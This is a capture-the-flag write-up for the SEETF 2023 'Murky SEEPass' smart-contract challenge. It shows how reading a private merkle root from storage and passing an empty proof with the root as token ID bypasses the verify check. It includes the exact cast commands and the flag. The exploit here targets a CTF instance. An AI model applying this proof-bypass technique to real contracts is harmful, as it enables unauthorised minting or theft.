# SEETF 2023 - Murky SEEPass [14 solves / 486 points]

### Description
```
The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed!

nc win.the.seetf.sg 8546
```

Our goal is to mint at least one token
```solidity
    function isSolved() external view returns (bool) {
        return pass.balanceOf(msg.sender) > 0;
    }
```

We can mint token with mintSeePass()
```solidity
    function mintSeePass(bytes32[] calldata _proof, uint256 _tokenId) public {
        require(!hasMinted(_tokenId), "Already minted");
        require(verify(_proof, _merkleRoot, _tokenId), "Invalid proof");

        _minted[_tokenId] = true;

        _safeMint(msg.sender, _tokenId);
    }
```

The merkle root is set in the constructor and it's private
```solidity
    bytes32 private _merkleRoot;
    mapping(uint256 => bool) private _minted;

    constructor(bytes32 _root) ERC721("SEE Pass", "SEEP") {
        _merkleRoot = _root;
    }
```

But we can still view it by viewing the storage
```
# cast storage 0xF9138A57510d57F4e0E2d506882bBC282DaE3Fd1 --rpc-url http://win.the.seetf.sg:8545/72c18fe1-aa24-41f8-bf55-c89a6608b71b 6
0xd158416f477eb6632dd0d44117c33220be333a420cd377fab5a00fdb72d27a10
```

This is the verify function that verify the merkle proof to the merkle root
```solidity
    function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) {
        bytes32 computedHash = bytes32(abi.encodePacked(index));

        require(root != bytes32(0), "MerkleProof: Root hash cannot be zero");
        require(computedHash != bytes32(0), "MerkleProof: Leaf hash cannot be zero");

        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];

            if (computedHash < proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }

        // Check if the computed hash (root) is equal to the provided root
        return computedHash == root;
    }
```

At first it convert the index to bytes32 and set that as computedHash

Then it has a for loop to iterate each proof in the proof array, but we can completely skip this loop by passing an empty array of proof, then it will be directly compared with the merkle root

mintSeePass() will call verify with the _tokenId as index for verify
```
    function mintSeePass(bytes32[] calldata _proof, uint256 _tokenId) public {
        require(!hasMinted(_tokenId), "Already minted");
        require(verify(_proof, _merkleRoot, _tokenId), "Invalid proof");
```
So we just need to pass the merkle root as _tokenId, then we can mint a token

```
# cast send 0xF9138A57510d57F4e0E2d506882bBC282DaE3Fd1 "mintSeePass(bytes32[], uint256)" [] 0xd158416f477eb6632dd0d44117c33220be333a420cd377fab5a00fdb72d27a10 --rpc-url http://win.the.seetf.sg:8545/72c18fe1-aa24-41f8-bf55-c89a6608b71b --private-key <key>
```

```
# nc win.the.seetf.sg 8546
1 - launch new instance
2 - kill instance
3 - acquire flag
action? 3
uuid please: 72c18fe1-aa24-41f8-bf55-c89a6608b71b

Congratulations! You have solve it! Here's the flag: 
SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}
```